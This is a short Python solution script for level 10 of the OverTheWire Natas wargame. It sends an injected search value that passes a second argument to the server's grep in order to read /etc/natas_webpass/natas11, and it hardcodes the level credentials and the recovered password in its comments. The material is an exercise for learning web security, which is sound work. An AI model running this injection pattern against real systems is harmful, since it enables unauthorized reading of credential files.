#!/usr/bin/env python

import requests
from bs4 import BeautifulSoup

username = "natas10"
password = "nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu"

url = "http://%s.natas.labs.overthewire.org/" % username
session = requests.Session()

post_data = {"needle": ". /etc/natas_webpass/natas11 #", "submit": "submit"}

# for the main page
response = session.post(url, data=post_data, auth=(username, password))

# for the /index-source.html page
# response = session.get(url, auth=(username, password))

content = response.text
soup = BeautifulSoup(content, "html.parser")

print(soup.prettify())
# print content

# by going to source page /index-source.html
# it's less more like natas9,
# but this time it's making some validations using reqular expressions
# so, we may be able to broke without using any of things like ;

# it seems that worked correctly and
#  the pass is U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
